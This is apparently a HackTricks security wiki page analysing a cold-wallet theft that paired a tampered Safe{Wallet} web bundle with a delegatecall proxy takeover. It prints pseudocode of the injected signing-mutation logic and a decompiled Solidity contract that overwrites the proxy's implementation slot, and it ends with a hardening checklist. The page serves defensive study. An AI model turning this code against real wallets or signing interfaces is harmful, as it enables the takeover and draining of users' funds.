# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Overview

A cold-wallet theft chain combined a **supply-chain compromise of the Safe{Wallet} web UI** with an **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)**. The key takeaways are:

- If a dApp can inject code into the signing path, it can make a signer produce a valid **EIP-712 signature over attacker-chosen fields** while restoring the original UI data so other signers remain unaware.
- Safe proxies store `masterCopy` (implementation) at **storage slot 0**. A delegatecall to a contract that writes to slot 0 effectively “upgrades” the Safe to attacker logic, yielding full control of the wallet.

## Off-chain: Targeted signing mutation in Safe{Wallet}

A tampered Safe bundle (`_app-*.js`) selectively attacked specific Safe + signer addresses. The injected logic executed right before the signing call:

```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
  tx.data.to = attackerContract;
  tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
  tx.data.operation = 1;                 // delegatecall
  tx.data.value = 0;
  tx.data.safeTxGas = 45746;
  const sig = await sdk.signTransaction(tx, safeVersion);
  sig.data = orig;                       // restore original before submission
  tx.data = orig;
  return sig;
}
```

### Attack properties
- **Context-gated**: hard-coded allowlists for victim Safes/signers prevented noise and lowered detection.
- **Last-moment mutation**: fields (`to`, `data`, `operation`, gas) were overwritten immediately before `signTransaction`, then reverted, so proposal payloads in the UI looked benign while signatures matched the attacker payload.
- **EIP-712 opacity**: wallets showed structured data but did not decode nested calldata or highlight `operation = delegatecall`, making the mutated message effectively blind-signed.

### Gateway validation relevance
Safe proposals are submitted to the **Safe Client Gateway**. Prior to hardened checks, the gateway could accept a proposal where `safeTxHash`/signature corresponded to different fields than the JSON body if the UI rewrote them post-signing. After the incident, the gateway now rejects proposals whose hash/signature do not match the submitted transaction. Similar server-side hash verification should be enforced on any signing-orchestration API.

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies keep `masterCopy` at **storage slot 0** and delegate all logic to it. Because Safe supports **`operation = 1` (delegatecall)**, any signed transaction can point to an arbitrary contract and execute its code in the proxy’s storage context.

An attacker contract mimicked an ERC-20 `transfer(address,uint256)` but instead wrote `_to` into slot 0:

```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
    stor0 = uint256(uint160(_to));
}
```

Execution path:
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy validates signatures over these parameters.
3. Proxy delegatecalls into `attackerContract`; the `transfer` body writes slot 0.
4. Slot 0 (`masterCopy`) now points to attacker-controlled logic → **full wallet takeover and fund drain**.

## Detection & hardening checklist

- **UI integrity**: pin JS assets / SRI; monitor bundle diffs; treat signing UI as part of the trust boundary.
- **Sign-time validation**: hardware wallets with **EIP-712 clear-signing**; explicitly render `operation` and decode nested calldata. Reject signing when `operation = 1` unless policy allows it.
- **Server-side hash checks**: gateways/services that relay proposals must recompute `safeTxHash` and validate signatures match the submitted fields.
- **Policy/allowlists**: preflight rules for `to`, selectors, asset types, and disallow delegatecall except for vetted flows. Require an internal policy service before broadcasting fully signed transactions.
- **Contract design**: avoid exposing arbitrary delegatecall in multisig/treasury wallets unless strictly necessary. Place upgrade pointers away from slot 0 or guard with explicit upgrade logic and access control.
- **Monitoring**: alert on delegatecall executions from wallets holding treasury funds, and on proposals that change `operation` from typical `call` patterns.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
